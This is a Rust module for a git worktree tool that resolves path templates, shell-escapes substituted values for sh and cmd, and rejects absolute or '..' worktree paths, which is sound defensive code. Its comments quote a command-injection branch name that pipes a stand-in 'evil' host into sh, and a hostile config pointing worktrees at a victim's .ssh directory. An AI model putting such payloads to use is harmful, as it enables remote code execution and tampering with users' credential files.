//! Template resolution + worktree path computation.
//!
//! Mirrors `branchlet/src/utils/path-utils.ts` exactly: variables are
//! substituted as `$KEY` tokens, and `getWorktreePath` joins the parent
//! directory of the git root with the resolved template, then with the
//! directory name.

use std::path::{Component, Path, PathBuf};

/// Variables available in user-supplied path templates and post-create
/// commands. Names match the upstream TS interface character-for-character so
/// existing `.wisetree.json` configs work unchanged.
#[derive(Debug, Clone, Default)]
pub struct TemplateVariables {
    pub base_path: String,
    pub worktree_path: String,
    pub branch_name: String,
    pub source_branch: String,
}

impl TemplateVariables {
    fn pairs(&self) -> [(&'static str, &str); 4] {
        [
            ("BASE_PATH", &self.base_path),
            ("WORKTREE_PATH", &self.worktree_path),
            ("BRANCH_NAME", &self.branch_name),
            ("SOURCE_BRANCH", &self.source_branch),
        ]
    }
}

/// Replace every `$KEY` occurrence in `template` with the matching value.
/// Unknown keys are left as-is (matches upstream).
pub fn resolve_template(template: &str, vars: &TemplateVariables) -> String {
    let mut out = template.to_string();
    for (key, value) in vars.pairs() {
        let needle = format!("${key}");
        out = out.replace(&needle, value);
    }
    out
}

/// Like `resolve_template`, but each substituted value is escaped so it
/// survives a single round of shell parsing as a single literal argument.
///
/// Use this whenever the resolved string is fed to `/bin/sh -c` or `cmd /C`.
/// Without it, a value containing shell metacharacters (e.g. a branch named
/// `main$(curl evil|sh)`) is concatenated into the command string and
/// re-interpreted by the shell, yielding arbitrary command execution.
pub fn resolve_template_shell(template: &str, vars: &TemplateVariables) -> String {
    let mut out = template.to_string();
    for (key, value) in vars.pairs() {
        let needle = format!("${key}");
        let escaped = if cfg!(target_os = "windows") {
            shell_escape_cmd(value)
        } else {
            shell_escape_posix(value)
        };
        out = out.replace(&needle, &escaped);
    }
    out
}

/// Quote `value` so POSIX `sh -c` reads it as one literal argument.
///
/// Wraps the value in single quotes and rewrites embedded single quotes as
/// `'\''`. Single-quoted strings in POSIX shell disable every form of
/// expansion (parameter, command, arithmetic, glob), so the result is inert.
pub fn shell_escape_posix(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for c in value.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Quote `value` for Windows `cmd /C`.
///
/// cmd.exe has no equivalent of POSIX single quotes: even inside `"..."`,
/// characters like `%`, `!`, `^`, `&`, `|`, `<`, `>` can be metacharacters
/// depending on whether delayed expansion is on. We wrap the value in double
/// quotes, double up embedded `"`, and caret-escape every cmd metacharacter
/// — including inside the quotes, where caret is still respected before the
/// next character is consumed.
pub fn shell_escape_cmd(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '"' => out.push_str("\"\""),
            '%' | '!' | '^' | '&' | '|' | '<' | '>' | '(' | ')' => {
                out.push('^');
                out.push(c);
            }
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Last path component of `git_root` — the repository's directory name.
pub fn repository_base_name(git_root: &Path) -> String {
    git_root
        .file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default()
}

/// Reason the resolved `worktreePathTemplate` was rejected.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PathTemplateError {
    /// Template resolved to an absolute path or Windows drive prefix.
    Absolute,
    /// Template resolved to a path containing `..`.
    ParentTraversal,
    /// Template resolved to an empty path component sequence.
    Empty,
}

impl std::fmt::Display for PathTemplateError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PathTemplateError::Absolute => {
                f.write_str("worktreePathTemplate must be relative, not absolute")
            }
            PathTemplateError::ParentTraversal => {
                f.write_str("worktreePathTemplate must not contain .. components")
            }
            PathTemplateError::Empty => {
                f.write_str("worktreePathTemplate resolved to an empty path")
            }
        }
    }
}

impl std::error::Error for PathTemplateError {}

/// Validate that a resolved `worktreePathTemplate` stays inside `parent_dir`.
///
/// Rejects absolute paths, Windows drive prefixes, and any `..` component
/// — anything else can only land at `<parent_dir>/<resolved>/<dir>`, which
/// the user already accepts when they place their repo there. Without this
/// check, a hostile project-local `.wisetree.json` shipping
/// `"worktreePathTemplate": "/Users/victim/.ssh"` would silently redirect
/// `git worktree add` and the subsequent file copy to an arbitrary
/// user-writable location.
pub fn validate_resolved_path_template(resolved: &str) -> Result<(), PathTemplateError> {
    let path = Path::new(resolved);
    let mut saw_component = false;
    for component in path.components() {
        match component {
            Component::Normal(_) | Component::CurDir => {
                saw_component = true;
            }
            Component::ParentDir => return Err(PathTemplateError::ParentTraversal),
            Component::RootDir | Component::Prefix(_) => return Err(PathTemplateError::Absolute),
        }
    }
    if !saw_component {
        return Err(PathTemplateError::Empty);
    }
    Ok(())
}

/// Compute the absolute path for a new worktree.
///
/// `template` is the user-configured `worktreePathTemplate`. The result is
/// `<parent of git_root>/<resolved template>/<directory_name>`. Returns
/// `PathTemplateError` when the resolved template would escape that anchor.
pub fn get_worktree_path(
    git_root: &Path,
    directory_name: &str,
    template: &str,
    branch_name: Option<&str>,
    source_branch: Option<&str>,
) -> Result<PathBuf, PathTemplateError> {
    let base_name = repository_base_name(git_root);
    let parent_dir = git_root.parent().map(Path::to_path_buf).unwrap_or_default();

    let vars = TemplateVariables {
        base_path: base_name,
        worktree_path: parent_dir
            .join(directory_name)
            .to_string_lossy()
            .into_owned(),
        branch_name: branch_name.unwrap_or("").to_string(),
        source_branch: source_branch.unwrap_or("").to_string(),
    };

    let resolved = resolve_template(template, &vars);
    validate_resolved_path_template(&resolved)?;
    Ok(parent_dir.join(resolved).join(directory_name))
}
